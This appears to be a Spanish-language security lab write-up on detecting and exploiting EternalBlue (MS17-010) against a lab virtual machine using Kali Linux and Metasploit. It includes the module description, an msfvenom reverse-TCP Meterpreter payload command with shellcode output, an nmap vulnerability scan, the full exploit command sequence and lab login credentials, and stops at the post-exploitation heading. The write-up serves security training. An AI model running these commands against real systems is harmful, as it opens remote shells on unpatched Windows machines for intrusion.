---
title: "Lab.03 - Kill Chain 3"
date: 2026-06-20
categories: [lab, setup]
tags: [kill Chain3, EternalBlue, metasploitable, kali]
---

# **KILL CHAIN 3: EternalBlue / MS17-010**

## **Lab: Detección y Explotación**

# Paso 0: Inspeccionar el módulo antes de explotar
Antes de lanzar el exploit, es importante conocer la herramienta con la que se trabajará. Para ello, se abre la terminal de **Kali Linux** y se ejecutan los comandos mostrados a continuación, los cuales permiten visualizar la información del módulo, sus características y las opciones de configuración antes de proceder con su ejecución.

    msfconsole -q
    use exploit/windows/smb/ms17_010_eternalblue
    info

![F1.1](/assets/KILL3/F1.1.png)

El comando **info** permite consultar la información del módulo antes de ejecutarlo. Entre los datos que muestra se encuentran los CVE, que son códigos que identifican oficialmente las vulnerabilidades que el exploit puede aprovechar, además de las plataformas compatibles, las opciones de configuración y una descripción técnica del problema de seguridad.

        Name: MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
        Module: exploit/windows/smb/ms17_010_eternalblue
    Platform: Windows
        Arch: x64
    Privileged: Yes
        License: Metasploit Framework License (BSD)
        Rank: Average
    Disclosed: 2017-03-14

    Provided by:
    Equation Group
    Shadow Brokers
    sleepya
    Sean Dillon <sean.dillon@risksense.com>
    Dylan Davis <dylan.davis@risksense.com>
    thelightcosine
    wvu <wvu@metasploit.com>
    agalway-r7
    cdelafuente-r7
    cdelafuente-r7
    agalway-r7

    Available targets:
        Id  Name
        --  ----
    =>  0   Automatic Target
        1   Windows 7
        2   Windows Embedded Standard 7
        3   Windows Server 2008 R2
        4   Windows 8
        5   Windows 8.1
        6   Windows Server 2012
        7   Windows 10 Pro
        8   Windows 10 Enterprise Evaluation

    Check supported:
    Yes

    Basic options:
    Name           Current Setting  Required  Description
    ----           ---------------  --------  -----------
    RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/d
                                                ocs/using-metasploit/basics/using-metasploit.html
    RPORT          445              yes       The target port (TCP)
    SMBDomain                       no        (Optional) The Windows domain to use for authenticati
                                                on. Only affects Windows Server 2008 R2, Windows 7, W
                                                indows Embedded Standard 7 target machines.
    SMBPass                         no        (Optional) The password for the specified username
    SMBUser                         no        (Optional) The username to authenticate as
    VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
                                                Only affects Windows Server 2008 R2, Windows 7, Windo
                                                ws Embedded Standard 7 target machines.
    VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affec
                                                ts Windows Server 2008 R2, Windows 7, Windows Embedde
                                                d Standard 7 target machines.

    Payload information:
    Space: 2000

    Description:
    This module is a port of the Equation Group ETERNALBLUE exploit, part of
    the FuzzBunch toolkit released by Shadow Brokers.

    There is a buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size
    is calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error where a
    DWORD is subtracted into a WORD. The kernel pool is groomed so that overflow
    is well laid-out to overwrite an SMBv1 buffer. Actual RIP hijack is later
    completed in srvnet!SrvNetWskReceiveComplete.

    This exploit, like the original may not trigger 100% of the time, and should be
    run continuously until triggered. It seems like the pool will get hot streaks
    and need a cool down period before the shells rain in again.

    The module will attempt to use Anonymous login, by default, to authenticate to perform the
    exploit. If the user supplies credentials in the SMBUser, SMBPass, and SMBDomain options it wiluse
    those instead.

    On some systems, this module may cause system instability and crashes, such as a BSOD or
    a reboot. This may be more likely with some payloads.

    References:
    https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
    https://nvd.nist.gov/vuln/detail/CVE-2017-0143
    https://nvd.nist.gov/vuln/detail/CVE-2017-0144
    https://nvd.nist.gov/vuln/detail/CVE-2017-0145
    https://nvd.nist.gov/vuln/detail/CVE-2017-0146
    https://nvd.nist.gov/vuln/detail/CVE-2017-0147
    https://nvd.nist.gov/vuln/detail/CVE-2017-0148
    https://github.com/RiskSense-Ops/MS17-010
    https://risksense.com/wp-content/uploads/2018/05/White-Paper_Eternal-Blue.pdf
    https://www.exploit-db.com/exploits/42030

    Also known as:
    ETERNALBLUE

    View the full module info with the info -d command.

Para ver dónde vive el archivo Ruby en Kali:

    INPUT: locate ms17_010_eternalblue.rb  
    OUTPUT: /usr/share/metasploit-framework/modules/exploits/windows/smb/ms17_010_eternalblue.rb

Vista de la terminal:
![F1.2](/assets/KILL3/F1.2.png)

Para visualizar cómo Metasploit construye el payload utilizando los parámetros previamente configurados, se ingresa el siguiente comando en la terminal.
    
    INPUT en Kali:
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.9 LPORT=4444 -f hex 2>/dev/null | head -c 160
    
    OUTPUT: primeros bytes del shellcode generado
    fc4883e4f0e8cc0000004151415052514831d25665488b5260488b5218488b52204d31c9480fb74a4a488b72504831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d0668178    

Vista del **LHOST** de la guía de laboratorio **(10.0.2.9)** y LHOST del usuario real **(10.0.2.3)**, respectimante:

![F1.3](/assets/KILL3/F1.3.png)
![F1.4](/assets/KILL3/F1.4.png)

**NOTA:** El valor LHOST=10.0.2.9 **(Según la IP de nuestra MV: LHOST=10.0.2.3)** y **LPORT=4444** se incorporan al payload durante su generación. Esto permite que, cuando el exploit se ejecute en la máquina víctima, el payload establezca una conexión de regreso hacia la máquina atacante a través del puerto 4444. Si se modifica el valor de LHOST, Metasploit debe generar un nuevo payload, ya que la dirección IP forma parte del código que se ejecutará en la víctima.

# Paso 1: Confirmar la vulnerabilidad

Se comprueba si la máquina víctima presenta vulnerabilidades antes de realizar la explotación.
Para la verificación tener en cuenta la contraseña para el ingreso que solicita **"sudo"**, ya que está pidiendo la contraseña del usuario de Kali Linux con el que se inició sesión. Siendo en Kali:

    USUARIO: user
    CONTRASEÑA: user123

    Comando utilizado:
    sudo nmap --script vuln -p 445 10.0.2.15

Output esperado:
![F1.5](/assets/KILL3/F1.5.png)

# Paso 2: Explotar con Metasploit

Comando ingresado para la explotación:

    msfconsole -q
    use exploit/windows/smb/ms17_010_eternalblue
    set RHOSTS 10.0.2.15
    set LHOST 10.0.2.3   (IP del lab guía: 10.0.2.9)
    set payload windows/x64/meterpreter/reverse_tcp
    run

Output esperado:
![F1.6](/assets/KILL3/F1.6.png)

# Paso 3: Post-Explotación con Meterpreter

